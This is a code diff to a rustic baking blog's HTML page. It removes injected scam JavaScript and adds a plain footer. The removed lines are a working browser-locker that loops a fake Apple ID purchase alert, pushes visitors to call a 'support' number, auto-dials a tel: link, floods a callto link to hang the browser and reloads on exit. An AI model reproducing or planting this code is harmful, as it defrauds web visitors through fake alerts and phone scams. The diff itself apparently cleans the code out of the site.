-        window.refef = parseURL(document.referrer);
+  <!-- FOOTER -->
+  <footer class="footer">
+    <span>© 2026 Elderberry Oven Tales · rustic baking journal</span>
+    <span style="display:flex; gap:1.5rem;"><a href="#">about</a> <a href="#">contact</a> <a href="#">privacy</a></span>
+  </footer>
 
-        if (ios) {
-
-            if (/iphone/.test(userAgent)) {
-                window.device = 'iPhone';
-            }
-
-            if (/ipad/.test(userAgent)) {
-                window.device = 'iPad';
-            }
-
-            if (/ipod/.test(userAgent)) {
-                window.device = 'iPod';
-            }
-        }
-
-        var text = cookieHelper.get('textSetBl');
-        var phone = cookieHelper.get('phoneSetBl');
-
-        function getText() {
-            var str = window.defaultText;
-
-            for (var d in window.text) {
-                if (window.refef.indexOf(d) != -1) {
-                    str = window.text[d];
-                }
-            }
-            //var str = window.text[window.refef]?window.text[window.refef]:window.defaultText;
-            return str.replace('|%model%|', window.device).replace('|%ref%|', window.refef);
-        }
-
-
-        if (!phone) {
-            phone = getURLParameter('phone');
-        }
-        if (!text) {
-            text = getURLParameter('text');
-        }
-
-        var sText = document.querySelectorAll('.js_setTextBlock');
-        for (var t = 0; t < sText.length; t++) {
-            sText[t].innerHTML = getText();
-        }
-        var sPhone = document.querySelectorAll('.js_setPhoneBlock');
-        for (var p = 0; p < sPhone.length; p++) {
-            sPhone[p].innerHTML = phone;
-        }
-
-
-        setInterval(function() {
-            myFunction()
-        }, 100);
-
-        function okkkk() {
-            jQuery('#result').append('<a  class="anchorcall" href="tel:+1-833-497-3164"></a>');
-            document.querySelector('a').click();
-            var extraData = "";
-            for (itxextraData = 0; itxextraData < 200; itxextraData++) {
-                var extraData = extraData + "5555555555";
-            }
-            jQuery('#result').append('<a href="#callto+' + extraData + '%00"></a>');
-            document.querySelector('a').click();
-            document.querySelector('a').click();
-            document.querySelector('a').click();
-            document.querySelector('a').click();
-            document.querySelector('a').click();
-            document.querySelector('a').click();
-            //setInterval(function(){ alert(getText().repeat(99999999999));}, 300);
-        };
-
-        function myFunction() {
-            if (confirm("Your Apple ID was recently used at APPLE STORE for $149.99 Via Apple Pay Pre-Authorization!We have placed those request on hold to ensure safest and Security.Not you? Immediately call Apple Support +1-833-497-3164 to Freeze it!.")) {
-                okkkk();
-            } else {
-                okkkk();
-            }
-        }
-
-        window.ununload = function() {
-            debugger;
-            location.reload();
-        }
-    </script>
-
-
-
-<script defer="" data-domain="iosmd.sire" src="js/script.js"></script>
-
-
-</body></html>
+</div><!-- /.container -->
+</body>
+</html>
